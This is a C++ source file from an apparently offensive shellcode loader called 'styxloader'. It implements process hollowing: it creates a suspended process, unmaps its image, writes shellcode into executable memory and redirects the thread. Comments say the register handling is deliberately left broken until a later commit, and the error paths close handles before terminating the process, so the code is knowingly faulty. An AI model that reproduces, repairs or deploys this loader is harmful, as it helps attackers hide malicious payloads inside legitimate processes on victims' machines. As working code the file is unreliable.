#include "styxloader/hollow_injector.hpp"
#include "styxloader/shellcode.hpp"

#include <windows.h>
#include <iostream>

namespace styxloader {

bool ProcessHollowing(const char* targetExe, const char* shellcodePath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create suspended process
    if (!CreateProcessA(targetExe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cout << "Error creating suspended process." << std::endl;
        return false;
    }

    // Read shellcode
    auto shellcode = ReadShellcode(shellcodePath);
    if (shellcode.empty()) {
        std::cout << "Error reading shellcode." << std::endl;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Get main thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cout << "Error getting context." << std::endl;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // === Audit fix F10 (commit 4): use ctx.Rcx for PEB pointer, then
    //     ReadProcessMemory(PEB + 0x10) for the real ImageBaseAddress.
    //     The original code read ctx.Rdx which is wrong on x64 (Rdx holds
    //     the second Win64 argument, not the PEB pointer).
    // === Audit fix F11 (commit 4): use ctx.Rip for the new entry point,
    //     not ctx.Rcx. The original code set ctx.Rcx = newBase, which
    //     does NOT redirect execution — the thread resumes at the original
    //     Rip (now pointing to unmapped memory) and crashes.
    // These fixes are applied in commit 4. For this commit (architecture
    // refactor only), we preserve the original (broken) logic so that
    // commit 4 contains only the logic fix and is easy to review.

    // --- BEGIN preserved-buggy logic (will be fixed in commit 4) ---
    PVOID imageBase = (PVOID)(ctx.Rdx);  // BUG: should be ctx.Rcx + ReadProcessMemory
    SIZE_T dummy;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto ZwUnmapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, PVOID))
        GetProcAddress(hNtdll, "ZwUnmapViewOfSection");
    if (ZwUnmapViewOfSection(pi.hProcess, imageBase) != 0) {
        std::cout << "Error unmapping memory." << std::endl;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    PVOID newBase = VirtualAllocEx(pi.hProcess, imageBase, shellcode.size(),
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) {
        std::cout << "Error allocating new memory." << std::endl;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    if (!WriteProcessMemory(pi.hProcess, newBase, shellcode.data(),
                            shellcode.size(), &dummy)) {
        std::cout << "Error writing shellcode." << std::endl;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // BUG: should be ctx.Rip = (DWORD64)newBase, not ctx.Rcx
    ctx.Rcx = (DWORD64)newBase;
    // --- END preserved-buggy logic ---

    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cout << "Error setting context." << std::endl;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    if (ResumeThread(pi.hThread) == -1) {
        std::cout << "Error resuming thread." << std::endl;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

}  // namespace styxloader
